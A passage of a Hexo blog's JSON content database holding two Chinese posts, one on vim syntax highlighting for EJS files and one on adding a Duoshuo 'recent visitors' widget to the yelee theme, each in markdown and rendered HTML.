bash\nau BufNewFile,BufRead *.ejs set filetype=html\n```\n\n详细au命令参见：[AUTOCMD](http://vimcdoc.sourceforge.net/doc/autocmd.html)\n\n\n### 方法二 定制ejs格式语法高亮\n\n#### 1. 下载ejs语法文件\n下载ejs.vim文件到~/.vim/syntax/目录。\n下载地址：https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\n\n文件内容如下：\n``` bash\nruntime! syntax/html.vim\nunlet b:current_syntax\n\n\" Include Java syntax\nsyn include @ejsJavaScript syntax/javascript.vim\n\nsyn region ejsScriptlet matchgroup=ejsTag start=/<%/  keepend end=/%>/ contains=@ejsJavaScript\nsyn region ejsExpr\tmatchgroup=ejsTag start=/<%=/ keepend end=/%>/ contains=@ejsJavaScript\n\n\" Redefine htmlTag so that it can contain jspExpr\nsyn clear htmlTag\nsyn region htmlTag start=+<[^/%]+ end=+>+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript\n\n\n\" syn keyword ejsPrint contained print\nsyn match javaScriptType        /\\<\\zsvars\\ze\\./\nsyn match javaScriptSpecial     /\\<\\zsexports\\ze\\./\nsyn match javaScriptFunction    /\\<\\zsprint\\ze(/\nsyn match javaScriptFunction    /\\<\\zsinclude\\ze(/\nsyn match javaScriptFunction    /\\<\\zsincludeObject\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetch\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetchObject\\ze(/\n\ncommand -nargs=+ HiLink hi def link <args>\nHiLink  ejsTag      htmlTag\ndelcommand HiLink\n\nlet b:current_syntax = \"ejs\"\n```\n\n#### 2. 设置ejs格式语法\n``` bash\n au BufNewFile,BufRead *.ejs set filetype=ejs\n```\n\n\n## 三、参考文档\n[Syntax highlight for .ejs files in vim](http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim)\n","slug":"article/hexo/vim高亮显示ejs格式内容","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqx001s5nbtfg7d3lf9","content":"<p><img src=\"/asserts/images/logo/ejs.png\" title=\"ejs\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p><a href=\"http://www.embeddedjs.com/\" target=\"_blank\" rel=\"external\">官方介绍</a>如下：</p>\n<blockquote>\n<p>EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.</p>\n</blockquote>\n<h2 id=\"二、解决方法\"><a href=\"#二、解决方法\" class=\"headerlink\" title=\"二、解决方法\"></a>二、解决方法</h2><h3 id=\"方法一-视ejs格式为html格式\"><a href=\"#方法一-视ejs格式为html格式\" class=\"headerlink\" title=\"方法一 视ejs格式为html格式\"></a>方法一 视ejs格式为html格式</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">au BufNewFile,BufRead *.ejs <span class=\"built_in\">set</span> filetype=html</div></pre></td></tr></table></figure>\n<p>详细au命令参见：<a href=\"http://vimcdoc.sourceforge.net/doc/autocmd.html\" target=\"_blank\" rel=\"external\">AUTOCMD</a></p>\n<h3 id=\"方法二-定制ejs格式语法高亮\"><a href=\"#方法二-定制ejs格式语法高亮\" class=\"headerlink\" title=\"方法二 定制ejs格式语法高亮\"></a>方法二 定制ejs格式语法高亮</h3><h4 id=\"1-下载ejs语法文件\"><a href=\"#1-下载ejs语法文件\" class=\"headerlink\" title=\"1. 下载ejs语法文件\"></a>1. 下载ejs语法文件</h4><p>下载ejs.vim文件到~/.vim/syntax/目录。<br>下载地址：<a href=\"https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\" target=\"_blank\" rel=\"external\">https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim</a></p>\n<p>文件内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\">runtime! syntax/html.vim</div><div class=\"line\">unlet b:current_syntax</div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">\" Include Java syntax</span></div><div class=\"line\">syn include @ejsJavaScript syntax/javascript.vim</div><div class=\"line\"></div><div class=\"line\">syn region ejsScriptlet matchgroup=ejsTag start=/&lt;%/  keepend end=/%&gt;/ contains=@ejsJavaScript</div><div class=\"line\">syn region ejsExpr\tmatchgroup=ejsTag start=/&lt;%=/ keepend end=/%&gt;/ contains=@ejsJavaScript</div><div class=\"line\"></div><div class=\"line\">\" Redefine htmlTag so that it can contain jspExpr</div><div class=\"line\">syn clear htmlTag</div><div class=\"line\">syn region htmlTag start=+&lt;[^/%]+ end=+&gt;+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">\" syn keyword ejsPrint contained print</span></div><div class=\"line\">syn match javaScriptType        /\\&lt;\\zsvars\\ze\\./</div><div class=\"line\">syn match javaScriptSpecial     /\\&lt;\\zsexports\\ze\\./</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsprint\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsinclude\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsincludeObject\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsfetch\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsfetchObject\\ze(/</div><div class=\"line\"></div><div class=\"line\">command -nargs=+ HiLink hi def link &lt;args&gt;</div><div class=\"line\">HiLink  ejsTag      htmlTag</div><div class=\"line\">delcommand HiLink</div><div class=\"line\"></div><div class=\"line\">let b:current_syntax = \"ejs<span class=\"string\">\"</span></div></pre></td></tr></table></figure></p>\n<h4 id=\"2-设置ejs格式语法\"><a href=\"#2-设置ejs格式语法\" class=\"headerlink\" title=\"2. 设置ejs格式语法\"></a>2. 设置ejs格式语法</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">au BufNewFile,BufRead *.ejs <span class=\"built_in\">set</span> filetype=ejs</div></pre></td></tr></table></figure>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim\" target=\"_blank\" rel=\"external\">Syntax highlight for .ejs files in vim</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/ejs.png\" title=\"ejs\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p><a href=\"http://www.embeddedjs.com/\">官方介绍</a>如下：</p>\n<blockquote>\n<p>EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.</p>\n</blockquote>\n<h2 id=\"二、解决方法\"><a href=\"#二、解决方法\" class=\"headerlink\" title=\"二、解决方法\"></a>二、解决方法</h2><h3 id=\"方法一-视ejs格式为html格式\"><a href=\"#方法一-视ejs格式为html格式\" class=\"headerlink\" title=\"方法一 视ejs格式为html格式\"></a>方法一 视ejs格式为html格式</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">au BufNewFile,BufRead *.ejs <span class=\"built_in\">set</span> filetype=html</div></pre></td></tr></table></figure>\n<p>详细au命令参见：<a href=\"http://vimcdoc.sourceforge.net/doc/autocmd.html\">AUTOCMD</a></p>\n<h3 id=\"方法二-定制ejs格式语法高亮\"><a href=\"#方法二-定制ejs格式语法高亮\" class=\"headerlink\" title=\"方法二 定制ejs格式语法高亮\"></a>方法二 定制ejs格式语法高亮</h3><h4 id=\"1-下载ejs语法文件\"><a href=\"#1-下载ejs语法文件\" class=\"headerlink\" title=\"1. 下载ejs语法文件\"></a>1. 下载ejs语法文件</h4><p>下载ejs.vim文件到~/.vim/syntax/目录。<br>下载地址：<a href=\"https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\">https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim</a></p>\n<p>文件内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\">runtime! syntax/html.vim</div><div class=\"line\">unlet b:current_syntax</div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">\" Include Java syntax</div><div class=\"line\">syn include @ejsJavaScript syntax/javascript.vim</div><div class=\"line\"></div><div class=\"line\">syn region ejsScriptlet matchgroup=ejsTag start=/&lt;%/  keepend end=/%&gt;/ contains=@ejsJavaScript</div><div class=\"line\">syn region ejsExpr\tmatchgroup=ejsTag start=/&lt;%=/ keepend end=/%&gt;/ contains=@ejsJavaScript</div><div class=\"line\"></div><div class=\"line\">\"</span> Redefine htmlTag so that it can contain jspExpr</div><div class=\"line\">syn clear htmlTag</div><div class=\"line\">syn region htmlTag start=+&lt;[^/%]+ end=+&gt;+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">\" syn keyword ejsPrint contained print</div><div class=\"line\">syn match javaScriptType        /\\&lt;\\zsvars\\ze\\./</div><div class=\"line\">syn match javaScriptSpecial     /\\&lt;\\zsexports\\ze\\./</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsprint\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsinclude\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsincludeObject\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsfetch\\ze(/</div><div class=\"line\">syn match javaScriptFunction    /\\&lt;\\zsfetchObject\\ze(/</div><div class=\"line\"></div><div class=\"line\">command -nargs=+ HiLink hi def link &lt;args&gt;</div><div class=\"line\">HiLink  ejsTag      htmlTag</div><div class=\"line\">delcommand HiLink</div><div class=\"line\"></div><div class=\"line\">let b:current_syntax = \"</span>ejs<span class=\"string\">\"</span></div></pre></td></tr></table></figure></p>\n<h4 id=\"2-设置ejs格式语法\"><a href=\"#2-设置ejs格式语法\" class=\"headerlink\" title=\"2. 设置ejs格式语法\"></a>2. 设置ejs格式语法</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">au BufNewFile,BufRead *.ejs <span class=\"built_in\">set</span> filetype=ejs</div></pre></td></tr></table></figure>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim\">Syntax highlight for .ejs files in vim</a></p>\n"},{"title":"yelee主题最近访客挂件","author":"yeshaoting","date":"2016-08-20T06:28:00.000Z","_content":"\n<img src=\"/asserts/images/logo/blog9.png\" title=\"blog\" class=\"img-logo img-center\" />\n\n## 一、前言\n最近将博客hexo主题由原来的jacman换成高大上的yelee。\n原来在jacman主题自定义了一些挂件，例如:多说的最近访客。\n希望将原来的 **最近访客** 挂件迁移到yelee主题。\n\n\n## 二、菜单项\n\n### 1. 查找菜单项文件\n通过chrome开发者工具，查看菜单 **关于我** 菜单项内容元素。\n``` html\n<section class=\"switch-part switch-part4\">\n    <div id=\"js-aboutme\">只求成为一名靠谱的码农</div>\n</section>\n```\n\n然后，根据元素标签特征(这里选 **switch-part4** )，在yelee主题目录搜索layout目录下包含 **switch-part4** 的文件内容。\n``` bash\nyerba-buena:yelee yeshaoting$ grep -ir \"switch-part4\" layout/\nlayout//_partial/left-col.ejs:                <section class=\"switch-part switch-part4\">\n```\n\n可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。\n\n### 2. 添加菜单项\n在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:\n``` html\n<div class=\"tips-box hide\">\n    <div class=\"tips-arrow\"></div>\n    <ul class=\"tips-inner\">\n        <li><%= __('index.menu') %></li>\n        <li><%= __('index.tags') %></li>\n        <%if(theme.friends && theme.friends.length != 0){%>\n        <li><%= __('index.friends') %></li>\n        <%}%>\n        <%if(theme.aboutme){%>\n        <li><%= __('index.about') %></li>\n        <%}%>\n        <%if(theme.visitor){%>\n        <li><%= __('index.visitor') %></li>\n        <%}%>\n    </ul>\n</div>\n```\n\n### 3. 菜单项名称\n由于主题支持多语言，因此通过 `__('index.visitor')` 这些的方法从语言包里获取对应的内容。\n该语言文件在主题的languages目录。我的设置为:\n``` plain\n# zh-Hans: Chinese (Simplified) 大陆简体\nindex:\n  menu: 菜单\n  tags: 标签\n  friends: 友情链接\n  about: 个人签名\n  visitor: 最近访客\n  more: 阅读全文\n  copy: 复制\n```\n\n### 4. 开启菜单项\n注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。\n同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:\n``` bash\n#是否开启“最近访客”功能。\nvisitor: true\n```\n\n### 5. 效果图\n![最近访客菜单项](/asserts/images/article/yelee主题最近访客/2016-08-20 13-41-17.jpg)\n\n\n<!-- more -->\n\n## 三、最近访客详情\n\n### 1. 准备挂件\n如果主题开启并使用了多说评论的话，只需要添加如下内容即可:\n``` html\n<ul class=\"ds-recent-visitors\"></ul>\n```\n\n如果并未开启多说评论的话，需要注册多说并额外添加多说js内容如下:\n``` html\n<!--多说js加载开始，一个页面只需要加载一次 -->\n<script type=\"text/javascript\">\nvar duoshuoQuery = {short_name:\"您的多说二级域名\"};\n(function() {\n    var ds = document.createElement('script');\n    ds.type = 'text/javascript';ds.async = true;\n    ds.src = 'http://static.duoshuo.com/embed.js';\n    ds.charset = 'UTF-8';\n    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);\n})();\n</script>\n<!--多说js加载结束，一个页面只需要加载一次 -->\n```\n\n这部分内容为了更加通用，可以将内容写入到ejs模板文件中，然后通过加载外部模板方式引入到主题中。\n我就是将上述内容放在自定义模板文件: `layout/_plugin/duoshuo_visitor.ejs` 。\n\n参见:[通用代码【最近访客】使用方法](http://dev.duoshuo.com/docs/4ff28d6f552860f21f00000c)\n\n### 2. 添加多说最近访客\n``` html\n<%if(theme.visitor){%>\n<section class=\"switch-part switch-part5\">\n    <div class=\"widget visitor\" id=\"js-visitor\">\n       <%- partial('_plugin/duoshuo_visitor') %>\n    </div>\n</section>\n<%}%>\n```\n\n### 3. 最近访客样式\n打开主题下 source/css/_partial/main.styl 文件。\n找到switch-part4节点，然后类似的添加 switch-part5 内容，如下:\n``` css\n.switch-part4{\n    left: 300%;\n    text-align: left;\n    line-height: 30px;\n}\n.switch-part5{\n    left: 400%;\n    line-height: 30px;\n    max-height: 260px;\n}\n```\n\n### 4. 添加详情页菜单项图标\n直接copy aboutme的图标内容。\n``` html\n<%if(theme.visitor){%>\n<div class=\"icon-wrap icon-me hide\" data-idx=\"4\">\n    <div class=\"user\"></div>\n    <div class=\"shoulder\"></div>\n</div>\n<%}%>\n```\n\n### 5. 效果图\n![最近访客详情页](/asserts/images/article/yelee主题最近访客/2016-08-20 14-27-49.jpg)\n\n","source":"_posts/article/hexo/yelee主题最近访客挂件.md","raw":"title: yelee主题最近访客挂件\ntags:\n  - hexo\ncategories:\n  - 博客搭建\nauthor: yeshaoting\ndate: 2016-08-20 14:28:00\n---\n\n<img src=\"/asserts/images/logo/blog9.png\" title=\"blog\" class=\"img-logo img-center\" />\n\n## 一、前言\n最近将博客hexo主题由原来的jacman换成高大上的yelee。\n原来在jacman主题自定义了一些挂件，例如:多说的最近访客。\n希望将原来的 **最近访客** 挂件迁移到yelee主题。\n\n\n## 二、菜单项\n\n### 1. 查找菜单项文件\n通过chrome开发者工具，查看菜单 **关于我** 菜单项内容元素。\n``` html\n<section class=\"switch-part switch-part4\">\n    <div id=\"js-aboutme\">只求成为一名靠谱的码农</div>\n</section>\n```\n\n然后，根据元素标签特征(这里选 **switch-part4** )，在yelee主题目录搜索layout目录下包含 **switch-part4** 的文件内容。\n``` bash\nyerba-buena:yelee yeshaoting$ grep -ir \"switch-part4\" layout/\nlayout//_partial/left-col.ejs:                <section class=\"switch-part switch-part4\">\n```\n\n可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。\n\n### 2. 添加菜单项\n在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:\n``` html\n<div class=\"tips-box hide\">\n    <div class=\"tips-arrow\"></div>\n    <ul class=\"tips-inner\">\n        <li><%= __('index.menu') %></li>\n        <li><%= __('index.tags') %></li>\n        <%if(theme.friends && theme.friends.length != 0){%>\n        <li><%= __('index.friends') %></li>\n        <%}%>\n        <%if(theme.aboutme){%>\n        <li><%= __('index.about') %></li>\n        <%}%>\n        <%if(theme.visitor){%>\n        <li><%= __('index.visitor') %></li>\n        <%}%>\n    </ul>\n</div>\n```\n\n### 3. 菜单项名称\n由于主题支持多语言，因此通过 `__('index.visitor')` 这些的方法从语言包里获取对应的内容。\n该语言文件在主题的languages目录。我的设置为:\n``` plain\n# zh-Hans: Chinese (Simplified) 大陆简体\nindex:\n  menu: 菜单\n  tags: 标签\n  friends: 友情链接\n  about: 个人签名\n  visitor: 最近访客\n  more: 阅读全文\n  copy: 复制\n```\n\n### 4. 开启菜单项\n注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。\n同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:\n``` bash\n#是否开启“最近访客”功能。\nvisitor: true\n```\n\n### 5. 效果图\n![最近访客菜单项](/asserts/images/article/yelee主题最近访客/2016-08-20 13-41-17.jpg)\n\n\n<!-- more -->\n\n## 三、最近访客详情\n\n### 1. 准备挂件\n如果主题开启并使用了多说评论的话，只需要添加如下内容即可:\n``` html\n<ul class=\"ds-recent-visitors\"></ul>\n```\n\n如果并未开启多说评论的话，需要注册多说并额外添加多说js内容如下:\n``` html\n<!--多说js加载开始，一个页面只需要加载一次 -->\n<script type=\"text/javascript\">\nvar duoshuoQuery = {short_name:\"您的多说二级域名\"};\n(function() {\n    var ds = document.createElement('script');\n    ds.type = 'text/javascript';ds.async = true;\n    ds.src = 'http://static.duoshuo.com/embed.js';\n    ds.charset = 'UTF-8';\n    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);\n})();\n</script>\n<!--多说js加载结束，一个页面只需要加载一次 -->\n```\n\n这部分内容为了更加通用，可以将内容写入到ejs模板文件中，然后通过加载外部模板方式引入到主题中。\n我就是将上述内容放在自定义模板文件: `layout/_plugin/duoshuo_visitor.ejs` 。\n\n参见:[通用代码【最近访客】使用方法](http://dev.duoshuo.com/docs/4ff28d6f552860f21f00000c)\n\n### 2. 添加多说最近访客\n``` html\n<%if(theme.visitor){%>\n<section class=\"switch-part switch-part5\">\n    <div class=\"widget visitor\" id=\"js-visitor\">\n       <%- partial('_plugin/duoshuo_visitor') %>\n    </div>\n</section>\n<%}%>\n```\n\n### 3. 最近访客样式\n打开主题下 source/css/_partial/main.styl 文件。\n找到switch-part4节点，然后类似的添加 switch-part5 内容，如下:\n``` css\n.switch-part4{\n    left: 300%;\n    text-align: left;\n    line-height: 30px;\n}\n.switch-part5{\n    left: 400%;\n    line-height: 30px;\n    max-height: 260px;\n}\n```\n\n### 4. 添加详情页菜单项图标\n直接copy aboutme的图标内容。\n``` html\n<%if(theme.visitor){%>\n<div class=\"icon-wrap icon-me hide\" data-idx=\"4\">\n    <div class=\"user\"></div>\n    <div class=\"shoulder\"></div>\n</div>\n<%}%>\n```\n\n### 5. 效果图\n![最近访客详情页](/asserts/images/article/yelee主题最近访客/2016-08-20 14-27-49.jpg)\n\n","slug":"article/hexo/yelee主题最近访客挂件","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxr1001w5nbtqqbop5wf","content":"<p><img src=\"/asserts/images/logo/blog9.png\" title=\"blog\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近将博客hexo主题由原来的jacman换成高大上的yelee。<br>原来在jacman主题自定义了一些挂件，例如:多说的最近访客。<br>希望将原来的 <strong>最近访客</strong> 挂件迁移到yelee主题。</p>\n<h2 id=\"二、菜单项\"><a href=\"#二、菜单项\" class=\"headerlink\" title=\"二、菜单项\"></a>二、菜单项</h2><h3 id=\"1-查找菜单项文件\"><a href=\"#1-查找菜单项文件\" class=\"headerlink\" title=\"1. 查找菜单项文件\"></a>1. 查找菜单项文件</h3><p>通过chrome开发者工具，查看菜单 <strong>关于我</strong> 菜单项内容元素。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span> <span class=\"attr\">class</span>=<span class=\"string\">\"switch-part switch-part4\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"js-aboutme\"</span>&gt;</span>只求成为一名靠谱的码农<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>然后，根据元素标签特征(这里选 <strong>switch-part4</strong> )，在yelee主题目录搜索layout目录下包含 <strong>switch-part4</strong> 的文件内容。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:yelee yeshaoting$ grep -ir <span class=\"string\">\"switch-part4\"</span> layout/</div><div class=\"line\">layout//_partial/left-col.ejs:                &lt;section class=<span class=\"string\">\"switch-part switch-part4\"</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。</p>\n<h3 id=\"2-添加菜单项\"><a href=\"#2-添加菜单项\" class=\"headerlink\" title=\"2. 添加菜单项\"></a>2. 添加菜单项</h3><p>在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-box hide\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-arrow\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-inner\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.menu</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.tags</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.friends</span> &amp;&amp; <span class=\"attr\">theme.friends.length</span> != <span class=\"string\">0)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.friends</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.aboutme)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.about</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.visitor</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"3-菜单项名称\"><a href=\"#3-菜单项名称\" class=\"headerlink\" title=\"3. 菜单项名称\"></a>3. 菜单项名称</h3><p>由于主题支持多语言，因此通过 <code>__(&#39;index.visitor&#39;)</code> 这些的方法从语言包里获取对应的内容。<br>该语言文件在主题的languages目录。我的设置为:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"># zh-Hans: Chinese (Simplified) 大陆简体</div><div class=\"line\">index:</div><div class=\"line\">  menu: 菜单</div><div class=\"line\">  tags: 标签</div><div class=\"line\">  friends: 友情链接</div><div class=\"line\">  about: 个人签名</div><div class=\"line\">  visitor: 最近访客</div><div class=\"line\">  more: 阅读全文</div><div class=\"line\">  copy: 复制</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-开启菜单项\"><a href=\"#4-开启菜单项\" class=\"headerlink\" title=\"4. 开启菜单项\"></a>4. 开启菜单项</h3><p>注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。<br>同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#是否开启“最近访客”功能。</span></div><div class=\"line\">visitor: <span class=\"literal\">true</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-效果图\"><a href=\"#5-效果图\" class=\"headerlink\" title=\"5. 效果图\"></a>5. 效果图</h3><p><img src=\"/asserts/images/article/yelee主题最近访客/2016-08-20 13-41-17.jpg\" alt=\"最近访客菜单项\"></p>\n<a id=\"more\"></a>\n<h2 id=\"三、最近访客详情\"><a href=\"#三、最近访客详情\" class=\"headerlink\" title=\"三、最近访客详情\"></a>三、最近访客详情</h2><h3 id=\"1-准备挂件\"><a href=\"#1-准备挂件\" 